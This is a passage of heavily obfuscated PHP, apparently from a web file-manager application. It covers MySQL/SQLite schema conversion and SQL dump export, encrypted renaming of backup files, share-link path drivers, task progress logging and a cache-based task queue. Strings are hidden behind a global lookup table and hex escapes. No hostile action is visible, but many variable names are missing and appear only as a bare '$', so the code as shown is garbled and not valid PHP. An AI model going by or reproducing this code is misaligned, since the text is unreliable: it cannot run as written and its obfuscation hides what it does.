} else { continue; } $Җ->execute($ߕ[1248] . $this->escapeName($搩) . $ߕ[1249]); } } private function sqlEncode($ڲ) { $ =& $_SERVER[ܮ]; $ = array(); foreach ($ڲ as $۽˭) { if (is_array($۽˭)) { $۽˭ = json_encode_force($۽˭); } $۽˭ = addslashes($۽˭); $۽˭ = str_replace(array($[1250], $[285], $[417]), array($[1251], $[1252], $[1253]), $۽˭); $[] = $۽˭; } return $[58] . implode($[1254], $) . $[58]; } private function sqlDecode($ϲՉ, $, $ = '') { $ =& $_SERVER[ܮ]; $ϲՉ = str_replace(array($[1251], $[1252], $[1253]), array($[1250], $[285], $[417]), $ϲՉ); if ($ == $[13]) { $ϲՉ = str_ireplace($[1255], $[59], $ϲՉ); $ϲՉ = stripslashes($ϲՉ); } return preg_replace($[1256], $[12], $ϲՉ); if ($ == $[13]) { return $ != $[472] ? stripslashes($ϲՉ) : $ϲՉ; } if ($ == $[472]) { $ϲՉ = str_replace($[1257], $[118], stripslashes($ϲՉ)); } return $ϲՉ; } public function getSqlFile($Ŷ = '') { $ =& $_SERVER[ܮ]; $ = $this->dbType(!0); $ = CONTROLLER_DIR . "\151\x6e\x73\x74\141\154\154\x2f\x64\x61\x74\x61\x2f{$}\56\x73\x71\154"; if (!file_exists($)) { return !1; } $՜ = file_get_contents($); $ = $[1258] . ($ == $[907] ? $[1259] : $[1260]) . $[1261]; preg_match_all($, $՜, $); $ٙՋ = $[1]; $Ս = $this->model()->db(); $ = $Ս->getTables(); $ = TEMP_FILES . $[1262] . date($[259]) . $[8]; del_dir($); mk_dir($); $孕 = $ . $[1263]; $ = $ . $[1264]; $ߌ = $ == $[13] ? $[907] : $[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\x73\x74\x61\x6c\154\57\x64\x61\164\x61\x2f{$ߌ}\x2e\x73\161\x6c", $); @touch($ . $ . $[889]); $ = fopen($孕, $[1236]); $⦜ = fopen($, $[1236]); if ($ == $[13]) { $ = array_diff($, array($[882], $[883])); $낡 = array($[1265], $[1266], $[1267]); fwrite($⦜, implode(PHP_EOL, $낡) . PHP_EOL . PHP_EOL); foreach ($ as $) { $׮ƴ = $this->sqlFromSqlite($); if (!$׮ƴ[$[13]]) { continue; } fwrite($⦜, $׮ƴ[$[13]] . PHP_EOL . PHP_EOL); if (!in_array($, $ٙՋ)) { fwrite($, $׮ƴ[$[907]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ as $) { $׮ƴ = $this->sqlFromMysql($); if (!$׮ƴ[$[907]]) { continue; } fwrite($, $׮ƴ[$[907]] . PHP_EOL . PHP_EOL); if (!in_array($, $ٙՋ)) { fwrite($⦜, $׮ƴ[$[13]] . PHP_EOL . PHP_EOL); } } } fclose($); fclose($⦜); $՜ = array($[907] => $孕, $[13] => $); return $Ŷ ? $՜[$Ŷ] : $՜; } public function dbType($ = false) { $ı =& $_SERVER[ܮ]; $˹ = $ ? $GLOBALS[$ı[6]][$ı[21]] : $this->database; $˹ = array_change_key_case($˹); $ĝ = $˹[$ı[1135]]; if ($ĝ == $ı[1132]) { $ȳ = explode($ı[4], $˹[$ı[1141]]); $ĝ = $ȳ[0]; } $̠ = array($ı[1268] => $ı[13], $ı[1077] => $ı[907]); if (isset($̠[$ĝ])) { $ĝ = $̠[$ĝ]; } return $ĝ; } public function sqlFromMysql($젵, $ = '') { $ٙ˿ =& $_SERVER[ܮ]; $ɷ = array($ٙ˿[907] => $ٙ˿[12], $ٙ˿[13] => $ٙ˿[12]); $ = $this->escapeName($젵); $σ = $this->escapeName($젵, $ٙ˿[13]); $۪ = $this->model()->db(); $ = $۪->query("\163\150\x6f\167\40\143\162\x65\141\x74\x65\40\x74\x61\142\x6c\x65\x20{$}\73"); if (!$ || !$[0]) { return !1; } $ = _get($[0], $ٙ˿[1269], $ٙ˿[12]); if (!$) { return !1; } $Р = "\104\122\117\120\40\124\101\102\114\x45\x20\111\106\40\x45\x58\111\123\x54\123\40{$}\x3b" . PHP_EOL . $ . $ٙ˿[74]; if ($ == $ٙ˿[907]) { return $Р; } $ɷ[$ٙ˿[907]] = $Р; $𕔗 = array_change_key_case($GLOBALS[$ٙ˿[6]][$ٙ˿[21]]); $ = $𕔗[$ٙ˿[1140]]; $ = $ٙ˿[1270] . $ . "\47\40\x41\116\x44\40\x54\101\x42\x4c\x45\x5f\116\x41\115\x45\x20\x3d\40{$σ}\x3b"; $Ś؝ = "\123\x48\x4f\127\40\x49\x4e\104\x45\130\40\x46\x52\x4f\x4d\40{$}\73"; $ = $۪->query($); if (empty($)) { return $ ? $ɷ[$] : $ɷ; } $՛¹ = $۪->query($Ś؝); $Ҟ = $ٙ˿[12]; $ߵ = array(); foreach ($՛¹ as $) { if (!$Ҟ && $[$ٙ˿[1271]] == $ٙ˿[1272]) { $Ҟ = $[$ٙ˿[1273]]; } if (isset($ߵ[$[$ٙ˿[1271]]])) { $ߵ[$[$ٙ˿[1271]]][$ٙ˿[1274]][] = $[$ٙ˿[1273]]; continue; } $ߵ[$[$ٙ˿[1271]]] = array($ٙ˿[1275] => $[$ٙ˿[1271]], $ٙ˿[1274] => array($[$ٙ˿[1273]]), $ٙ˿[1276] => $[$ٙ˿[1277]] == $ٙ˿[91] ? 0 : 1); } $Վܖ = array(); foreach ($ߵ as $) { $ˁ = $[$ٙ˿[1275]] == $ٙ˿[1272]; $̅ = $[$ٙ˿[1276]] == $ٙ˿[91] && !$ˁ ? $ٙ˿[1278] : $ٙ˿[12]; $ڼ = $ٙ˿[1279] . $젵 . $ٙ˿[11] . ($ˁ ? $ٙ˿[1280] : $[$ٙ˿[1275]]); $ = $ٙ˿[1281] . implode($ٙ˿[1282], $[$ٙ˿[1274]]) . $ٙ˿[1283]; $Վܖ[] = sprintf($ٙ˿[1284], $ٙ˿[1285], $̅, $ٙ˿[1286], $ڼ, $ٙ˿[1287], $젵, $); } $ = array(); $и = array($ٙ˿[1288] => $ٙ˿[390], $ٙ˿[1289] => $ٙ˿[390], $ٙ˿[364] => $ٙ˿[390], $ٙ˿[363] => $ٙ˿[390], $ٙ˿[1290] => $ٙ˿[1291], $ٙ˿[1292] => $ٙ˿[1291], $ٙ˿[1291] => $ٙ˿[1291], $ٙ˿[1293] => $ٙ˿[1291], $ٙ˿[282] => $ٙ˿[1291], $ٙ˿[1294] => $ٙ˿[1291], $ٙ˿[1295] => $ٙ˿[1291], $ٙ˿[1296] => $ٙ˿[1297], $ٙ˿[365] => $ٙ˿[1297], $ٙ˿[366] => $ٙ˿[1297], $ٙ˿[1298] => $ٙ˿[1298]); foreach ($ as $) { $ = _get($и, $[$ٙ˿[1299]], $[$ٙ˿[1300]]); $ġ = $[$ٙ˿[1301]] == $ٙ˿[1060] ? $ٙ˿[1302] : $ٙ˿[1303]; $Ʒͨ = $[$ٙ˿[1304]] == $Ҟ ? $ٙ˿[1305] : $ٙ˿[12]; $ = $[$ٙ˿[1114]] ? strtoupper(str_replace($ٙ˿[11], $ٙ˿[12], $[$ٙ˿[1114]])) : $ٙ˿[12]; $[] = sprintf($ٙ˿[1306], $[$ٙ˿[1304]], $, $ġ, $Ʒͨ, $); } $ = array("\x44\122\x4f\120\40\x54\x41\x42\114\x45\x20\x49\106\40\105\x58\111\x53\124\x53\x20{$σ}\73", "\103\x52\105\101\124\x45\x20\124\101\x42\114\105\x20{$σ}\40\x28", implode($ٙ˿[50] . PHP_EOL, $), $ٙ˿[1307]); $ = implode(PHP_EOL, array_merge($, $Վܖ)); if ($ == $ٙ˿[13]) { return $; } $ɷ[$ٙ˿[13]] = $; return $ɷ; } public function sqlFromSqlite($ߍ, $ = '') { $ʥ =& $_SERVER[ܮ]; $ş = array($ʥ[907] => $ʥ[12], $ʥ[13] => $ʥ[12]); $ = $this->escapeName($ߍ); $Ձϲ = $this->escapeName($ߍ, $ʥ[13]); $ۇ̹ = $this->model()->db(); $Ʃ = "\x50\x52\101\x47\115\x41\40\x54\101\x42\x4c\x45\137\111\x4e\x46\x4f\x20\x28\47{$ߍ}\47\x29"; $Σں = "\123\105\114\105\103\x54\x20\x2a\40\x46\122\117\115\40\163\x71\x6c\x69\x74\x65\137\x6d\x61\x73\x74\x65\162\40\127\110\x45\122\x45\40\164\x62\x6c\137\156\x61\x6d\x65\40\x3d\40\x27{$ߍ}\x27"; $ = $ۇ̹->query($Ʃ); if (empty($)) { return $ ? $ş[$] : $ş; } $ȃŇ = $ۇ̹->query($Σں); $ = $ = array(); foreach ($ȃŇ as $) { if ($[$ʥ[33]] == $ʥ[357]) { $[] = $[$ʥ[1308]]; } else { $[] = $[$ʥ[1308]]; } } $ = array_merge(array("\104\x52\x4f\x50\x20\x54\x41\102\114\x45\40\111\106\40\105\x58\111\123\x54\123\x20{$Ձϲ}\x3b"), $, $); $ = implode($ʥ[74] . PHP_EOL, $) . $ʥ[74]; if ($ == $ʥ[13]) { return $; } $ş[$ʥ[13]] = $; $ = $ܭ = array(); $ = array(); $ݑ̀ = array(); foreach ($ȃŇ as $) { if ($[$ʥ[33]] == $ʥ[1309]) { $ = $[$ʥ[1308]]; $Ϻ = stripos($, $ʥ[1278]) !== !1; $ѭ = stripos($, $ʥ[1272]) !== !1; preg_match($ʥ[1310], $, $); if (empty($)) { continue; } $Ʒ = array_map($ʥ[1311], explode($ʥ[50], $[1])); $ջ = array(); foreach ($Ʒ as $ݜ) { $ۨ = trim($ݜ, $ʥ[1312]); $ջ[] = $ۨ; $[$ۨ] = !0; } $ݑ̀[] = array($ʥ[32] => $[$ʥ[32]], $ʥ[1308] => $, $ʥ[1313] => $Ϻ, $ʥ[1314] => $ѭ, $ʥ[1315] => $ջ); } } $ۮ = array($ʥ[1289] => $ʥ[1289], $ʥ[390] => $ʥ[1316], $ʥ[1297] => $ʥ[1317], $ʥ[1291] => $ʥ[1291], $ʥ[1298] => $ʥ[1318], $ʥ[1319] => $ʥ[1320]); $㊉ = array($ʥ[451], $ʥ[168], $ʥ[540]); $܃ = array($ʥ[390], $ʥ[1297], $ʥ[1319], $ʥ[1289]); foreach ($ as $) { $ = $[$ʥ[32]]; $Ǆ = strtolower($[$ʥ[33]]); if ($Ǆ == $ʥ[1291] && isset($[$])) { $ = in_array($, $㊉) ? $ʥ[1291] : $ʥ[1321]; } else { $ = _get($ۮ, $Ǆ, $Ǆ); } if ($[$ʥ[57]] > 0) { $ܭ[$[$ʥ[57]]] = $; } $î = $ʥ[12]; if ($[$ʥ[56]] !== null) { $۪ = $[$ʥ[56]]; if (in_array($Ǆ, $܃) && is_numeric($۪)) { $î = "\104\105\106\101\x55\x4c\124\x20{$۪}"; } else { if (strtolower($۪) === $ʥ[103]) { $î = $[$ʥ[35]] ? $ʥ[12] : $ʥ[1303]; } else { $ = is_numeric($۪) ? $۪ : $ʥ[58] . addslashes($۪) . $ʥ[58]; $î = "\104\105\x46\x41\125\114\124\x20{$}"; } } } $įș = $[$ʥ[35]] ? $ʥ[1302] : $ʥ[1322]; $̰ = stripos($Ǆ, $ʥ[364]) !== !1 && $[$ʥ[57]] ? $ʥ[1323] : $ʥ[12]; $[] = sprintf($ʥ[1324], $, $, $įș, $î, $̰); } if (!empty($ܭ)) { ksort($ܭ); $ώ = $ʥ[475] . implode($ʥ[1244], $ܭ) . $ʥ[475]; $[] = "\x50\122\x49\x4d\101\122\131\x20\x4b\x45\131\40\x28{$ώ}\x29"; } foreach ($ݑ̀ as $) { if ($[$ʥ[1314]]) { continue; } $ = array(); foreach ($[$ʥ[1315]] as $ݜ) { $ۮ = null; foreach ($ as $) { if ($[$ʥ[32]] == $ݜ) { $ۮ = strtolower($[$ʥ[33]]); break; } } if ($ۮ == $ʥ[1291] && in_array($ݜ, $㊉)) { $[] = "\x60{$ݜ}\x60\x28\62\x35\60\51"; } else { $[] = "\x60{$ݜ}\x60"; } } $Ǆ = ($[$ʥ[1313]] ? $ʥ[1325] : $ʥ[12]) . $ʥ[1326]; $ = str_replace($ʥ[1279] . $ߍ . $ʥ[11], $ʥ[12], $[$ʥ[32]]); $ = str_replace($ߍ . $ʥ[11], $ʥ[12], $); $[] = "{$Ǆ}\40\140{$}\x60\40\50" . implode($ʥ[50], $) . $ʥ[1243]; } $إ = array("\x44\122\117\x50\x20\x54\101\x42\114\x45\x20\x49\106\40\x45\130\111\123\124\x53\40{$}\x3b", "\x43\122\x45\x41\124\105\40\124\x41\102\114\105\x20{$}\x20\x28", implode($ʥ[50] . PHP_EOL, $), $ʥ[1327]); $إ = implode(PHP_EOL, $إ); if ($ == $ʥ[907]) { return $إ; } $ş[$ʥ[907]] = $إ; return $ş; } private function escapeName($ɘ, $ي = "\x6d\171\x73\x71\x6c") { $и =& $_SERVER[ܮ]; $ɘ = preg_replace($и[1328], $и[12], $ɘ); if ($ي === $и[907]) { return "\x60{$ɘ}\140"; } return "\x22{$ɘ}\42"; } public function mixBakList($) { $듵 =& $_SERVER[ܮ]; $ = rtrim($, $듵[8]) . $듵[8]; $燃 = $듵[1329]; $ = IO::listPath($); if (empty($[$듵[86]])) { return !1; } $ = array(); foreach ($[$듵[86]] as $Ͼ => $낼) { if (!$낼[$듵[32]] || !$낼[$듵[87]]) { continue; } $ѥǪ = Mcrypt::encode($낼[$듵[32]], $燃); $괒 = md5($ѥǪ); IO::rename($낼[$듵[87]], $괒); $[$괒] = $ѥǪ; } $Ѱ = md5($듵[1330] . $燃); IO::setContent($ . $Ѱ, json_encode($)); return !0; } public function unmixBakList($ëƊ) { $ =& $_SERVER[ܮ]; $ëƊ = rtrim($ëƊ, $[8]) . $[8]; $ܸ = $this->unmixBakListGet($ëƊ, !0); if (empty($ܸ)) { return !1; } foreach ($ܸ as $ => $ק) { $̄ = IO::rename($ëƊ . $ק, $); if (!$̄) { return !1; } } return !0; } public function unmixBakListGet($, $ = false) { $ׂ =& $_SERVER[ܮ]; $ = rtrim($, $ׂ[8]) . $ׂ[8]; $Ο = $ׂ[1329]; $₩ = md5($ׂ[1330] . $Ο); $ = $ . $₩; if (!IO::exist($)) { return !1; } $ȏ = json_decode(IO::getContent($), !0); if (empty($ȏ)) { return !1; } $톶 = array(); foreach ($ȏ as $ﵽ => $ޓ) { $₩ = Mcrypt::decode($ޓ, $Ο); $톶[$₩] = $ﵽ; } if ($) { IO::remove($, !1); } return $톶; } } goto bښަ; c͕: class PathDriverDbShareLink extends PathDriverDB { public function __construct($) { $this->pathParse = $; $this->model = Model($_SERVER[ܮ][1534]); } protected function infoParse($̱, $Ƒ = false, $ = false) { $ =& $_SERVER[ܮ]; return Action($[1363])->sharePathInfo($this->pathParse[$[87]], !0, $Ƒ); } public function listPath($ʣɄ, $漁 = false) { $ =& $_SERVER[ܮ]; $ާ = parent::listPath($ʣɄ, $漁); if (!$ާ) { return $ާ; } if (is_array($ާ[$[973]])) { $ާ[$[973]] = Action($[1363])->shareItemInfo($ާ[$[973]]); } foreach ($ާ as $ => $Ѥ) { if (!in_array($, array($[86], $[85]))) { continue; } foreach ($Ѥ as $ռ => $) { $ާ[$][$ռ] = Action($[1363])->shareItemInfo($); } } return $ާ; } public function listAll($ƹ) { $Ӣ֫ =& $_SERVER[ܮ]; $֜ = IO::info($this->pathParse[$Ӣ֫[87]]); if (!$֜) { return array(); } $ˑ = $this->model->listAll($ƹ); foreach ($ˑ as &$弖) { $弖[$Ӣ֫[90]] = Action($Ӣ֫[1363])->shareItemInfo($弖[$Ӣ֫[90]]); } unset($弖); return $ˑ; } } class PathDriverDriverShareItem { public function __construct($室) { $this->pathParse = $室; } public function __call($Г, $) { $ =& $_SERVER[ܮ]; if (method_exists($this, $Г)) { return; } $ѧ = call_user_func_array(array($[1542], $Г), $); $ = array($[1543], $[1544], $[1545], $[1546], $[641], $[643], $[1547], $[107], $[1548], $[1549]); if (in_array($Г, $)) { $ѧ = $this->getPathOuter($ѧ); } return $ѧ; } public function copy($֖, $, $焠 = false, $ = false) { return $this->copyMove($֖, $, $焠, $_SERVER[ܮ][641], $); } public function move($׎, $ϵ, $ᶏ = false, $ć = false) { return $this->copyMove($׎, $ϵ, $ᶏ, $_SERVER[ܮ][643], $ć); } private function copyMove($, $, $ז, $, $ӷ = false) { $ =& $_SERVER[ܮ]; $ = $; $椪 = IO::driverMake($); if ($椪->pathParse[$[1337]]) { $ = $椪->pathParse[$[1337]]; } else { $ = $; } $մ = IO::copyMove($, $, $ז, $, $ӷ); $մ = $this->getPathOuter($մ); return $մ; } public function pathThis($) { return get_path_this($this->pathParse[$_SERVER[ܮ][87]]); } public function pathFather($) { return get_path_father($this->pathParse[$_SERVER[ܮ][87]]); } public function iconvSystem($) { return $; } protected function infoParse($, $ = false) { $أ =& $_SERVER[ܮ]; $ư = $this->pathParse[$أ[576]][$أ[583]] . $this->pathParse[$أ[1356]]; if ($) { $ = IO::infoWithChildren($ư); } else { $ = IO::info($ư); } $ = $this->pathParse[$أ[576]]; return Action($أ[1541])->_shareItemeParse($, $); } public function listAll($ߨ) { $֨ =& $_SERVER[ܮ]; $ɰ = IO::listAll($ߨ); $߄ = rtrim($this->pathParse[$֨[576]][$֨[583]], $֨[8]); foreach ($ɰ as &$) { $[$֨[87]] = $this->pathDriver . $֨[8] . ltrim(substr($[$֨[87]], strlen($߄)), $֨[8]); } unset($); return $ɰ; } public function listAllSimple($ɧЦ, $ = false) { $Ӻ =& $_SERVER[ܮ]; $ = $this->listAll($ɧЦ); $ = $this->pathParse[$Ӻ[510]]; if (trim($, $Ӻ[8]) == trim(get_path_father($), $Ӻ[8])) { $ = !0; } return IO::init($Ӻ[12])->listAllSimpleMake($, $, $); } public function getPathOuter($) { $ʱ =& $_SERVER[ܮ]; $Ȭ = KodIO::parse($); if ($Ȭ[$ʱ[33]] == KodIO::KOD_SHARE_ITEM) { return $Ȭ[$ʱ[87]]; } $杳 = KodIO::clear($); $筕 = KodIO::clear($this->pathParse[$ʱ[576]][$ʱ[583]]); $ʗ = substr($杳, strlen($筕)); if (substr($杳, 0, strlen($筕)) != $筕) { return !1; } return $this->pathParse[$ʱ[1357]] . $ʱ[8] . ltrim($ʗ, $ʱ[8]); } public function getType() { $ =& $_SERVER[ܮ]; $ = str_replace($[77], $[12], get_class($this)); return strtolower($); } public function isOsDriver($빌) { return IO::isOsDriver($빌); } public function info($) { return $this->infoParse($); } public function infoAuth($ߥꉟ) { return $this->infoParse($ߥꉟ); } public function infoWithChildren($Ԭ) { return $this->infoParse($Ԭ, !0); } public function infoFull($̣) { return $this->infoParse($̣); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($) { $this->pathParse = $; } protected function infoParse($, $ = false) { $ٍ =& $_SERVER[ܮ]; return Action($ٍ[1363])->sharePathInfo($this->pathParse[$ٍ[87]], !0, $); } public function listPath($, $߱ = false) { $ =& $_SERVER[ܮ]; $ = IO::listPath($, $߱); if (!$) { return $; } if (is_array($[$[973]])) { $ = Action($[1550])->parsePathChildren($[$[973]], array($[510] => $)); $[$[973]] = Action($[1363])->shareItemInfo($); } foreach ($ as $ۗ => $ӧ) { if (!in_array($ۗ, array($[86], $[85]))) { continue; } foreach ($ӧ as $ => $) { $ = Action($[1550])->parsePathChildren($, array($[510] => $)); $[$ۗ][$] = Action($[1363])->shareItemInfo($); } } return $; } } goto B; e: class TaskHttp extends Task { protected function startAfter() { $ =& $_SERVER[ܮ]; $ϩ =& $this->task; $ϩ[$[2062]] = 1; Hook::bind($[2022], array($this, $[2063])); Hook::bind($[2024], array($this, $[2064])); Hook::bind($[2026], array($this, $[2065])); } protected function endAfter() { $̏ =& $_SERVER[ܮ]; Hook::unbind($̏[2022], array($this, $̏[2063])); Hook::unbind($̏[2024], array($this, $̏[2064])); Hook::unbind($̏[2026], array($this, $̏[2065])); } public function progressStart($չ) { $ױ =& $_SERVER[ܮ]; $ = curl_getinfo($չ); self::log($ױ[2066] . $[$ױ[382]]); self::valueSet($this->task[$ױ[487]], $this->task); } public function progressEnd($) { $좏 =& $_SERVER[ܮ]; self::log($좏[2067] . $this->task[$좏[487]]); $this->end(); } public function progress($ȕ, $ֵ, $, $, $ұ) { $ܑ =& $_SERVER[ܮ]; $ =& $this->task; if ($ұ > 0) { $[$ܑ[1232]] = $[$ܑ[1232]] == 0 ? $ : $[$ܑ[1232]]; $[$ܑ[1977]] = $ұ; } else { if ($ > 0) { $[$ܑ[1232]] = $[$ܑ[1232]] == 0 ? $ֵ : $[$ܑ[1232]]; $[$ܑ[1977]] = $; } } $this->update(); self::log("\x70\162\157\147\x72\x65\163\163\x48\x74\x74\x70\72\x64\x6f\x77\156\72{$}\x2f{$ֵ}\x3b\x20\165\160\154\157\141\x64\x3a{$ұ}\57{$}\73"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($ܨ, $ډ = '', $ = 0, $Ƚ = '') { $ =& $_SERVER[ܮ]; $Ƚ = $Ƚ ? $Ƚ : ($ډ ? $ډ : $ܨ); $̏ߋ = new Task($ܨ, $ډ, $, $Ƚ); $GLOBALS[$[2068] . $ܨ] = new TaskLog($[1961], $̏ߋ, $Ƚ); return $̏ߋ; } public function __construct($籊 = '', $֦ = '', $ = '') { $ћ =& $_SERVER[ܮ]; if (!$籊) { $籊 = $ћ[1961]; } $߰ = $籊 . $ћ[476] . rand_string(10); if (!$) { $ = $籊 . $ћ[53] . $; } switch ($籊) { case $ћ[1961]: if (!$֦ || !$֦->task) { return echoLog($籊 . $ћ[2069]); } $ = $֦; $߰ = $->task[$ћ[487]]; $籊 = $->task[$ћ[487]]; if (!$->task[$ћ[1866]]) { $->task[$ћ[1866]] = $ ? $ : $籊; } break; case $ћ[2070]: if (!$֦) { return echoLog($籊 . $ћ[2071]); } $ = is_string($֦) ? array($֦) : $֦; $ = new TaskFileTransfer($߰, $籊, 0, $ ? $ : $[0]); foreach ($ as $) { $->addPath($); } break; case $ћ[388]: if (!$֦) { return echoLog($籊 . $ћ[2071]); } $ = is_string($֦) ? array($֦) : $֦; $ = new TaskZip($߰, $籊, 0, $ ? $ : $[0]); foreach ($ as $) { $->addPath($); } break; case $ћ[1405]: if (!$֦) { return echoLog($籊 . $ћ[2071]); } $ = new TaskUnZip($߰, $籊, 0, $ ? $ : $֦); if ($֦) { $->addFile($֦); } break; case $ћ[149]: $ = new TaskHttp($߰, $籊); break; default: return; break; } $this->task = $; $this->taskID = $߰; Hook::bind($ћ[1997], array($this, $ћ[2072])); Hook::bind($ћ[1999], array($this, $ћ[2073])); Hook::bind($ћ[1993], array($this, $ћ[2074])); echoLog($ћ[2075] . $->task[$ћ[1866]]); } public function __destruct() { $this->end(); } public function end($֔ = '') { $ =& $_SERVER[ܮ]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($֔); $this->task = !1; $this->taskID = !1; Hook::unbind($[1997], array($this, $[2072])); Hook::unbind($[1999], array($this, $[2073])); Hook::unbind($[1993], array($this, $[2074])); } public function taskUpdate($) { $ =& $_SERVER[ܮ]; if (!$ || $this->taskID != $[$[487]]) { return; } $ÆՂ = 20; $ = intval($[$[1978]] * $ÆՂ); $ = $[173] . str_repeat($[464], $) . $[1182] . str_repeat($[53], $ÆՂ - $) . $[175]; $߆ = $ . sprintf($[2076], $[$[1978]] * 100) . $[2077]; $Ȩ = $߆ . $[$[1977]] . $[8] . $[$[1232]] . LNG($[2078]); $ = $[12]; if ($[$[2062]]) { $Ȩ = $߆ . size_format($[$[1977]]) . $[8] . size_format($[$[1232]]); $ = size_format($[$[1979]]) . $[2079]; } if ($[$[1234]]) { $[$[2028]] = $[$[1234]] . $[53] . $[$[2028]]; } if ($[$[2028]]) { $ = $[12]; if ($[$[2030]]) { $ = $[50] . size_format($[$[2031]]) . $[8] . size_format($[$[2030]]); } $ .= $[$[2028]] . $; } if ($[$[862]] && !$[$[2030]]) { $ .= $[53] . size_format($[$[947]]) . $[8] . size_format($[$[862]]); } echoLog($Ȩ . $[53] . $, !0); } public function taskEnd($Ͱͫ) { $ =& $_SERVER[ܮ]; if (!$Ͱͫ || $this->taskID != $Ͱͫ[$[487]]) { return; } $ = $Ͱͫ ? LNG($[2080]) . $[4] . $Ͱͫ[$[1977]] . $[8] . $Ͱͫ[$[1232]] . LNG($[2078]) . $[74] : $[12]; echoLog($[2081] . $Ͱͫ[$[1866]] . ($Ͱͫ[$[540]] ? $[74] . $Ͱͫ[$[540]] : $[12]) . $[74] . $ . $[2082] . sprintf($[1014], timeFloat() - $Ͱͫ[$[1980]]) . $[1992]); $this->end(); } public function taskKill($䭛) { $կֿ =& $_SERVER[ܮ]; if (!$䭛 || $this->taskID != $䭛[$կֿ[487]]) { return; } echoLog($կֿ[2083] . $䭛[$կֿ[1866]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\141\163\x6b\121\x75\x65\x75\x65\114\x65\x6e\147\164\150"; const QUEUE_DATA = "\x74\x61\x73\153\x51\165\145\165\x65\104\141\x74\x61"; const QUEUE_TIME = "\164\141\x73\x6b\x51\165\x65\x75\x65\114\141\163\x74\122\x75\x6e"; const QUEUE_THREAD = "\164\x61\x73\153\x51\x75\x65\x75\145\x54\150\x72\x65\141\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($, $Ѹ = array(), $ = '', $ = '') { $Ԗ =& $_SERVER[ܮ]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($ && array_find_by_field(self::$listData, $Ԗ[95], $)) { return !0; } if ($ && array_find_by_field(self::$listDataAdd, $Ԗ[95], $)) { return !0; } self::$listDataAdd[] = array($Ԗ[342] => $, $Ԗ[2084] => $Ѹ, $Ԗ[540] => $, $Ԗ[95] => $); return !0; } public static function addSubmit() { $ =& $_SERVER[ܮ]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($[2085] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $[12], $[540])), $[195]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($ň, $ = array(), $̉ = '', $߆ = '') { $ =& $_SERVER[ܮ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $띪 = self::getAll(); if ($߆ && array_find_by_field($띪, $[95], $߆)) { return !0; } $띪[] = array($[342] => $ň, $[2084] => $, $[540] => $̉, $[95] => $߆); self::setAll($띪); write_log($[2085] . $̉, $[195]); return !0; } public static function run() { $柽ɶ =& $_SERVER[ܮ]; $ = self::getAll(); $􌱄 = array_shift($); if (!$􌱄) { return !1; } self::setAll($); $ = timeFloat(); $ƥ = $柽ɶ[12]; try { $ƥ = Hook::apply($􌱄[$柽ɶ[342]], $􌱄[$柽ɶ[2084]]); } catch (Exception $ޓ) { write_log($ޓ, $柽ɶ[1371]); } $م = number_format(timeFloat() - $, 3) . $柽ɶ[1992]; if ($ƥ && is_string($ƥ)) { $م = $م . $柽ɶ[2086] . $ƥ; } write_log($柽ɶ[2087] . $􌱄[$柽ɶ[540]] . $柽ɶ[2088] . $م, $柽ɶ[195]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $ۣҫ =& $_SERVER[ܮ]; $ = self::threadCount() + 1; if ($ > 3 || !self::count()) { return; } write_log($ۣҫ[2089] . $, $ۣҫ[195]); Cache::set(self::QUEUE_THREAD, $, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($ۣҫ[2090], $ۣҫ[195]); } public static function getKey($ǹ, $󎳰 = "\151\156\164") { $ӵ =& $_SERVER[ܮ]; Cache::removeMemory($ǹ); $񟹘 = Cache::get($ǹ); if ($󎳰 == $ӵ[364]) { return $񟹘 ? intval($񟹘) : 0; } if ($󎳰 == $ӵ[2091]) { return is_array($񟹘) ? $񟹘 : array(); } return $񟹘; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[ܮ][2091]); } public static function setAll($勐) { $պ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($勐), $պ); Cache::set(self::QUEUE_DATA, $勐, $պ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } goto fЦ籖; f︭: class AnalysisModel extends ModelBaseLight { public function init($̙) { $ț =& $_SERVER[ܮ]; $ = array($ț[684] => array($ț[33] => $ț[2114], $ț[351] => array($ț[282], $ț[864], $ț[2115], $ț[2116])), $ț[2117] => array($ț[33] => $ț[2118], $ț[351] => array($ț[282], $ț[862], $ț[2119], $ț[2120], $ț[2121]))); if (!isset($[$̙])) { return !1; } $this->optionType = $[$̙][$ț[33]]; $this->field = $[$̙][$ț[351]]; return !0; } public function listData($ = false, $ڂ = "\155\157\144\151\146\x79\124\x69\155\x65", $ۛ˚ = false) { return parent::listData($, $ڂ, $ۛ˚); } public function trendList($Ϡ) { $ʋ =& $_SERVER[ܮ]; $ߏ = $this->listData(); if ($ߏ) { $‎ = end($ߏ); $ߨ = date($ʋ[2122], strtotime($ʋ[2123])); if ($‎[$ʋ[282]] == $ߨ) { return $ߏ; } $׻Ƈ = strtotime($‎[$ʋ[282]]); } if (!isset($׻Ƈ)) { $ݍ = $Ϡ == $ʋ[684] ? $ʋ[617] : $ʋ[939]; $׻Ƈ = Model($ݍ)->min($ʋ[231]); } $ = $ʋ[2124] . ucfirst($Ϡ); $Ջ = $this->dateList($׻Ƈ); foreach ($Ջ as $ߨ) { 